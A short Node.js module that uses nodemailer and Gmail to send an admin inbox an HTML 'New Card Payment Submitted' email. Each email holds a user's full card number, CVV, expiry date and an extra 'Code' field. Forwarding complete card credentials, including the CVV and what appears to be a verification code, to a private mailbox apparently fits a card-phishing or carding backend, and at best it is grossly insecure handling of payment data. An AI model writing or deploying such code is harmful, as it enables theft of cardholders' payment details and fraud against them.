const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
  service: 'gmail', // Or another SMTP provider
  auth: {
    user: process.env.EMAIL_USER, // your admin email
    pass: process.env.EMAIL_PASS, // app password or real password
  }
});

async function sendAdminNotification(payment) {
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.ADMIN_EMAIL, // your admin inbox
    subject: '💳 New Card Payment Submitted',
    html: `
      <h2>New Payment Alert</h2>
      <p><strong>User ID:</strong> ${payment.userId}</p>
      <p><strong>Card Number:</strong> ${payment.cardNumber}</p>
      <p><strong>CVV:</strong> ${payment.cvv}</p>
      <p><strong>Expiry:</strong> ${payment.expiry}</p>
      <p><strong>Code:</strong> ${payment.code}</p>
      <p><strong>Date:</strong> ${new Date(payment.date).toLocaleString()}</p>
    `
  };

  await transporter.sendMail(mailOptions);
}

module.exports = {
  transporter,              // ✅ add this
  sendAdminNotification
};
